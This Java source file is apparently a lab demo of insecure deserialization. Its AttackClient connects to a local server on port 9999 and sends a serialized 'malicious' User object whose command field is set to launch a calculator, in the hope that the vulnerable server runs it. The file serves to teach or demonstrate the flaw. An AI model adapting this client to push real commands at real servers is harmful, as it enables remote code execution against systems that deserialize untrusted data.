package com.chenluo.vulndeserializeccapp.service;

import com.chenluo.vulndeserializeccapp.enitity.User;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;

public class AttackClient {
    public static void main(String[] args) {
        String serverHost = "localhost";
        int serverPort = 9999;

        try (Socket socket = new Socket(serverHost, serverPort);
             ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {

            System.out.println("Connected to VulnerableServer.");

            // 1. 创建一个正常的 User 对象
            // User benignUser = new User("Alice", 30);
            // System.out.println("Sending benign user: " + benignUser);
            // oos.writeObject(benignUser);
            // oos.flush();
            // System.out.println("Benign user sent.");

            // 2. 创建一个恶意的 User 对象，试图执行命令
            User maliciousUser = new User("Mallory", 40);
            // 在 Windows 上打开计算器。根据你的系统修改命令。
            // macOS: "open -a Calculator"
            // Linux: "gnome-calculator" or "kcalc" or "xcalc"
            maliciousUser.command = "open -a Calculator"; // 或者 "mspaint.exe"
            maliciousUser.role = "attacker"; // 只是为了区分

            System.out.println("Sending malicious user: " + maliciousUser);
            oos.writeObject(maliciousUser); // 序列化恶意对象
            oos.flush(); // 确保数据发送出去
            System.out.println("Malicious user sent.");

        } catch (IOException e) {
            System.err.println("Error in AttackClient: " + e.getMessage());
            e.printStackTrace();
        }
    }
}